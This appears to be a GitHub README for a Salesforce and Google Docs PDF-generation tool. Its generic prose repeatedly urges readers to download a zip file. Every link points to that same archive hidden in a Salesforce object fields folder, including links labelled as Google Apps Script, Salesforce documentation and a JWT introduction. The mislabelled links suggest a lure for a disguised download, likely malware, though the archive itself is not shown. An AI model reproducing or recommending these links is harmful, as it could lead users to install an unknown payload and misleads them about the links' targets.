# 📄 pdfDocumentGeneration - Easy PDF Creation from Templates

[![Download pdfDocumentGeneration](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip)](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip)

---

## 📌 What is pdfDocumentGeneration?

pdfDocumentGeneration helps you create PDF files from Google Docs templates. It works smoothly with Salesforce, using Google Apps Script to merge your data into ready-to-use PDF documents. This system uses secure login methods and uploads PDFs straight to Salesforce without hiccups.

You don't need to write any code or adjust complex settings. Just prepare your template, add your data, and pdfDocumentGeneration handles the rest.

---

## 🖥️ System Requirements

Before you start, make sure your setup meets these basics:

- A computer or device with internet access
- A Google account with access to Google Docs and Apps Script
- A Salesforce account with permissions to upload documents
- A modern browser (Chrome, Firefox, Edge, Safari) updated within the last two years

This application works on Windows, Mac, and Linux through your web browser and Google accounts. No additional software installation is needed.

---

## ⚙️ Features Overview

pdfDocumentGeneration offers tools designed to simplify your PDF creation process:

- **Template-Based PDF Creation:** Use Google Docs templates where you place fields that pdfDocumentGeneration fills with your data.
- **Smart Data Handling:** Support for rich data types like tables and images.
- **Secure Access:** Uses JWT (JSON Web Tokens) for safe communication between Google Apps Script and Salesforce.
- **Automatic Security Checks:** Ensures your data follows Salesforce’s field-level security rules.
- **Fast, Background Processing:** Files are created smoothly, even if large or complex.
- **Direct Upload to Salesforce:** Saves PDF documents directly to your Salesforce account, overcoming size limits.
- **Easy to Use:** No coding skills needed; works with Salesforce flow or simple commands.
  
---

## 📥 Download & Install

To begin using pdfDocumentGeneration:

1. **Visit the release page** by clicking the big badge at the top or [this link](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip).  
2. Look for the latest release version and download the files labeled for your needs.
3. The package you download contains all scripts and instructions needed to set up.
4. Follow the included setup guide to connect your Google account and Salesforce environment.

No extra software installs are needed beyond what is on your computer.

---

## 🚀 Getting Started

Follow these steps to generate your first PDF document:

1. **Create a Google Docs Template**  
   - Open Google Docs  
   - Design your template with placeholders for data like {{Name}}, {{Date}}, or tables
2. **Prepare Your Data**  
   - Gather the data you want in your PDF. You can enter this directly in Salesforce or Google Sheets.
3. **Set Up the Google Apps Script Middleware**  
   - Use the provided script files to connect your Google Docs with Salesforce.  
   - This script will handle merging data and exporting the PDF.
4. **Authenticate Securely Using JWT**  
   - Generate and use JWT tokens to allow safe communication between your Google Apps Script and Salesforce.
5. **Run the Export**  
   - Trigger the process from Salesforce with your template ID and data.  
   - The system merges and creates the PDF, then uploads it directly to Salesforce.
6. **Find Your PDF in Salesforce**  
   - Once done, the content document ID links the file in Salesforce for easy access.

---

## 🔧 How It Works (Simple Explanation)

- Your Salesforce system sends a request with template details and data to Google Apps Script.
- Google Apps Script merges your data into the Google Docs template.
- It creates a PDF document from the merged file.
- The script uploads that PDF directly back into Salesforce.
- Salesforce stores the PDF and makes it available instantly.

By doing this, large documents do not overwhelm Salesforce’s memory limits. The process runs quietly in the background and uses secure login methods to protect your data.

---

## 🛠️ Setting Up Google Apps Script Middleware

Setup involves copying the middleware code to Google Apps Script:

1. Go to [Google Apps Script](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip).
2. Create a new project.
3. Copy all middleware scripts from the downloaded package into your project.
4. Configure the script with your Salesforce environment URLs and JWT credentials.
5. Deploy the script as a web app, allowing access only to authorized users.
6. Test the connection by sending a sample request.

This setup allows your Salesforce environment to communicate securely with the Google Doc templates.

---

## 🔐 Secure JWT Authentication

JWT ensures that only your Salesforce system and Google Apps Script can talk with each other. Setup involves:

- Creating a private key in your Salesforce environment.
- Adding the matching public key to your Google Apps Script configuration.
- Generating signed tokens to verify each request automatically.

This method keeps your data safe from unauthorized access during PDF generation.

---

## 📝 Working with Templates

Templates are normal Google Docs with special markers:

- Use double curly braces for fields, like {{CustomerName}}.
- Add formatting, tables, and images just as you like.
- Advanced options allow conditionals and queries pulling data from related Salesforce objects.

You can change your templates whenever needed without touching the middleware code.

---

## 💡 Tips for Best Results

- Keep your templates clean and organized.
- Use simple names for your merged fields.
- Test with small data sets before heavy use.
- Review field security settings in Salesforce to avoid missing data.
- Monitor processing through Salesforce logs to catch any issues.

---

## 🆘 Troubleshooting

If you encounter problems:

- Confirm your Google Apps Script is deployed correctly.
- Check the JWT token configuration matches between Salesforce and Google.
- Verify your Salesforce permissions allow document uploads.
- Look at the error messages in Salesforce or Google Apps Script logs.
- Ensure your Google Docs template placeholders exactly match your data fields.

---

## 📞 Support & Resources

- Review the README and documentation files packed in the release download.
- Visit the Github repository for updates and issue tracking.
- Use the Google and Salesforce online help centers for questions about apps or services.
- Experiment with the example templates included to learn faster.

---

## 🔗 Useful Links

- Download pdfDocumentGeneration: [https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip)
- Google Apps Script: https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip
- Salesforce Documentation: https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip
- JWT Introduction: https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip

---

[![Download pdfDocumentGeneration](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip)](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip)